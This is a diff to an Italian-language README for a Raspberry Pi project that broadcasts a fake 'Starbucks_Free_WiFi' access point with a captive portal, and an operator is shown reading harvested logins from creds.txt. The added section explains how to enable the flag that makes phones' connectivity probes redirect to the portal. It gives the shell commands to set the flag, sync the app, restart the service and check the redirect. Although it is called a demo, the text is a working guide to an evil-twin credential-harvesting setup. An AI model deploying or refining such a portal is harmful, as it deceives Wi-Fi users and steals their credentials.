@@ -93,7 +93,60 @@ quando il router ci sblocca, il marker sparisce e viene loggato
 (`journalctl -u portal-passthrough`).
 
 
-## 6. Comandi per chi fa la demo (operatore)
+## 6. Aggiornare un Pi già configurato (flag PORTAL_ENABLED)
+
+Dalla versione con il fix "captive solo in modalità Pi", l'app
+reindirizza gli host sconosciuti **solo se** `/etc/starbucks-portal.env`
+contiene `PORTAL_ENABLED=1`. Senza il flag l'app resta un sito normale: la
+pagina del portale si vede comunque su `http://10.3.0.1/`, ma le probe
+captive (`generate_204`, `hotspot-detect.html`) ricevono 404 invece di 302 e,
+dopo il login, il telefono non riceve il 204 che chiude il popup del portale.
+
+> **Non impostare mai il flag su Render** (o su un host con hostname
+> pubblico): con il flag attivo ogni richiesta verrebbe reindirizzata
+> all'indirizzo locale (127.0.0.1) e il sito non si aprirebbe più. Il flag
+> è riservato al Pi, dove `setup.sh` lo scrive da solo.
+
+### Migrazione di un Pi già funzionante (senza rilanciare setup.sh)
+
+1. Controlla se il flag è già presente (sul Pi):
+
+   ```bash
+   grep PORTAL_ENABLED /etc/starbucks-portal.env || echo "flag assente"
+   ```
+
+2. Aggiungilo, se manca:
+
+   ```bash
+   echo "PORTAL_ENABLED=1" | sudo tee -a /etc/starbucks-portal.env
+   ```
+
+3. Aggiorna i file dell'app dal PC (come da README, sezione "Copia il
+   progetto sul Pi"):
+
+   ```bash
+   rsync -av --exclude node_modules --exclude .git ./ pi@<ip-del-pi>:/opt/starbucks-portal/
+   ```
+
+4. Riavvia il servizio:
+
+   ```bash
+   ssh pi@<ip-del-pi> "sudo systemctl restart starbucks-portal"
+   ```
+
+5. Verifica il comportamento captive: la probe deve ricevere `302` verso il
+   portale (senza flag avresti `404`):
+
+   ```bash
+   curl -sI -H "Host: connectivitycheck.gstatic.com" http://10.3.0.1/generate_204 | head -1
+   # HTTP/1.1 302 Found  (Location: http://10.3.0.1/)
+   journalctl -u starbucks-portal -n 5   # nessun errore all'avvio
+   ```
+
+Se invece rilanci tutto `setup.sh`, non serve alcun passo manuale: lo script
+scrive `PORTAL_ENABLED=1` in `/etc/starbucks-portal.env` da solo.
+
+## 7. Comandi per chi fa la demo (operatore)
 
 Il laptop dell'operatore si collega alla rete AP del Pi
 (`Starbucks_Free_WiFi`, IP del Pi: `10.3.0.1`).
@@ -136,7 +189,7 @@ tail -n 3 /opt/starbucks-portal/instance/creds.txt
 ```
 
 
-## 7. Troubleshooting rapido del login manuale
+## 8. Troubleshooting rapido del login manuale
 
 | Sintomo | Causa probabile | Cosa fare |
 |---|---|---|
@@ -146,7 +199,7 @@ tail -n 3 /opt/starbucks-portal/instance/creds.txt
 | Login fatto ma `generate_204` non torna `204` | Sessione portale non registrata (60%) / IP diverso (20%) | Riapri il portale e rifai login; controlla che il Pi usi lo stesso IP |
 | Il marker `/tmp/portal-blocked` ricompare | Timer in corso (40%) / sessione scaduta (40%) | Aspetta il prossimo check o rifai il login |
 
-## 8. Note
+## 9. Note
 
 - Il login del router va fatto **una sola volta** (finché la sessione del
   router non scade): dopo, il Pi ha Internet e i telefoni sbloccati navigano.
